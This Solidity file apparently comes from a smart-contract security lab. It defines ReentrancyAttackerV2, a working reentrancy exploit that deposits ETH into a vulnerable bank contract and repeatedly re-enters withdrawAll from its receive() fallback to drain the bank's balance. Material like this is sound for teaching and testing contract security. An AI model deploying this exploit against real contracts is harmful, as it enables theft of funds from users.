// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IVulnerableBankV2 {
    function deposit() external payable;
    function withdrawAll() external;
}

contract ReentrancyAttackerV2 {
    IVulnerableBankV2 public bank;
    uint256 public maxLoops = 10;
    uint256 public loops;

    constructor(address bankAddress) {
        bank = IVulnerableBankV2(bankAddress);
    }

    function setMaxLoops(uint256 _maxLoops) external {
        maxLoops = _maxLoops;
    }

    function attack() external payable {
        require(msg.value > 0, "need ETH");
        loops = 0;

        bank.deposit{value: msg.value}();
        bank.withdrawAll();
    }

    receive() external payable {
        if (address(bank).balance > 0 && loops < maxLoops) {
            loops++;
            bank.withdrawAll();
        }
    }
}
